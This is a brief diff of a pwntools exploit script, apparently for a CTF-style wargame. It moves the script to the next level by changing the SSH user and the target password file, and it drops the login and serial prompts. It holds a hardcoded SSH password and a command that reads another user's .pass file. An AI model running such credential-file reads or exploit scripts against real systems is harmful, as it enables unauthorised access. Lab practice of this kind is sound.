@@ -12,7 +12,7 @@ context.log_level = 'info'  # Niveau de log (debug, info, warning, error)
 LOCAL = False  # Mettre à False pour l'exploitation SSH
 HOST = "localhost"  # Hôte pour SSH
 PORT = 8881  # Port pour SSH
-USER = "level06"  # Nom d'utilisateur SSH
+USER = "level07"  # Nom d'utilisateur SSH
 PASSWORD = "h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq"  # Mot de passe SSH
 SSH_SESSION = None
 
@@ -93,19 +93,10 @@ def exploit():
           ''')
 
 
-    print(conn.recvuntil(b'Enter Login:'))
-    print(login)
-    conn.sendline(login)
-
-
-    print(conn.recvuntil(b'Enter Serial:'))
-    print(serial)
-    conn.sendline(serial)
-
     try:
         if not LOCAL:
             conn.recvuntil(b'$')
-            conn.sendline('cat /home/users/level07/.pass')
+            conn.sendline('cat /home/users/level08/.pass')
             flag = conn.recvline()
             print("\n=== Flag ===")
             print(flag.decode())
